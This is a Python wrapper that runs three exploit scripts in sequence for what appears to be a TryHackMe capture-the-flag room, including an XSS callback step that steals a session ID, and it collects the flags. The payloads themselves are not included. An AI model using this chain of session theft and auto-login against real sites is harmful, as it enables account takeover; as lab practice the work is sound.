#!/usr/bin/env python3
"""Run the full THM Sequence chain (Flag 1 -> Flag 2 -> Final Flag) non-interactively.

This orchestrator executes the existing scripts in order:
1) sequence_first_flag.py
2) sequence_second_flag.py
3) sequence_this_flag.py

It captures output, extracts THM flags, and prints a compact summary.
"""

import argparse
import os
import re
import subprocess
import sys
from pathlib import Path


FLAG_RE = re.compile(r"THM\{[^}]+\}")


def run_step(name, cmd, cwd):
    print(f"\n{'=' * 70}")
    print(f"[RUN] {name}")
    print(f"[CMD] {' '.join(cmd)}")
    print(f"{'=' * 70}")

    proc = subprocess.run(
        cmd,
        cwd=str(cwd),
        text=True,
        capture_output=True,
    )

    if proc.stdout:
        print(proc.stdout.rstrip())
    if proc.stderr:
        print(proc.stderr.rstrip())

    flags = FLAG_RE.findall((proc.stdout or "") + "\n" + (proc.stderr or ""))
    return proc.returncode, flags


def write_sid_file(base_dir, sid):
    sid_path = base_dir / "mod_sid.txt"
    sid_path.write_text(sid.strip() + "\n", encoding="utf-8")
    print(f"[i] Wrote SID to {sid_path}")


def main():
    parser = argparse.ArgumentParser(description="THM Sequence full non-interactive run")
    parser.add_argument("--target", default="http://10.82.129.17", help="Target base URL")
    parser.add_argument("--lhost", help="Callback IP for Flag 1 XSS step")
    parser.add_argument("--lport", type=int, default=8888, help="Callback port for Flag 1")
    parser.add_argument("--first-timeout", type=int, default=180, help="Timeout for Flag 1 XSS callback")
    parser.add_argument("--second-timeout", type=int, default=300, help="Timeout for Flag 2 poll")
    parser.add_argument("--poll-interval", type=int, default=10, help="Flag 2 poll interval")
    parser.add_argument("--promote-base", default="http://review.thm", help="Host used in chat promote URL")
    parser.add_argument("--finance-pass", help="Optional finance password for final step")
    parser.add_argument("--phpsessid", help="Use an existing SID and skip callback wait in Flag 1")
    args = parser.parse_args()

    here = Path(__file__).resolve().parent
    py = sys.executable

    f1_path = here / "sequence_first_flag.py"
    f2_path = here / "sequence_second_flag.py"
    f3_path = here / "sequence_this_flag.py"

    missing = [p.name for p in (f1_path, f2_path, f3_path) if not p.exists()]
    if missing:
        print(f"[!] Missing required scripts: {', '.join(missing)}")
        sys.exit(1)

    all_flags = []

    # Step 1
    if args.phpsessid:
        write_sid_file(here, args.phpsessid)
        cmd1 = [
            py,
            str(f1_path),
            "--lhost",
            "x",
            "--phpsessid",
            args.phpsessid,
        ]
    else:
        if not args.lhost:
            print("[!] --lhost is required when --phpsessid is not provided.")
            sys.exit(1)
        cmd1 = [
            py,
            str(f1_path),
            "--lhost",
            args.lhost,
            "--lport",
            str(args.lport),
            "--timeout",
            str(args.first_timeout),
        ]

    rc1, flags1 = run_step("Flag 1", cmd1, here)
    all_flags.extend(flags1)
    if rc1 != 0:
        print("[!] Step 1 failed. Stopping.")
        sys.exit(rc1)

    # Step 2
    cmd2 = [
        py,
        str(f2_path),
        "--target",
        args.target,
        "--promote-base",
        args.promote_base,
        "--timeout",
        str(args.second_timeout),
        "--poll-interval",
        str(args.poll_interval),
        "--auto-login",
    ]
    rc2, flags2 = run_step("Flag 2", cmd2, here)
    all_flags.extend(flags2)
    if rc2 != 0:
        print("[!] Step 2 failed. Stopping.")
        sys.exit(rc2)

    # Step 3
    cmd3 = [
        py,
        str(f3_path),
        "--target",
        args.target,
    ]
    if args.finance_pass:
        cmd3.extend(["--finance-pass", args.finance_pass])

    rc3, flags3 = run_step("Final Flag", cmd3, here)
    all_flags.extend(flags3)
    if rc3 != 0:
        print("[!] Step 3 failed. Stopping.")
        sys.exit(rc3)

    uniq_flags = []
    seen = set()
    for flag in all_flags:
        if flag not in seen:
            seen.add(flag)
            uniq_flags.append(flag)

    print(f"\n{'#' * 70}")
    print("FULL RUN COMPLETE")
    print(f"{'#' * 70}")
    if uniq_flags:
        for i, flag in enumerate(uniq_flags, 1):
            print(f"{i}. {flag}")
    else:
        print("[!] No THM flags parsed from output.")


if __name__ == "__main__":
    main()
